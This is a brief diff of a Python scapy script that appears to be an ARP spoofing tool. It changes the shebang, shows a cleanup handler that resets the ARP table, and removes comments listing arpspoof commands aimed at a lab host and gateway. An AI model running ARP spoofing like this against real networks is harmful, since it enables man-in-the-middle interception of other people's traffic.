@@ -1,5 +1,4 @@
-#!/usr/bin/python
-
+#! python3
 import scapy.all as scapy
 import optparse as op
 from time import sleep
@@ -54,7 +53,3 @@ try:
 except KeyboardInterrupt:
     print("\nReseting arp table......")
     reset_arp_table()
-
-# tool used for spoofing
-    # arpspoof -i eth0 -t 10.0.2.5 10.0.2.1
-    # arpspoof -i eth0 -t 10.0.2.1 10.0.2.5
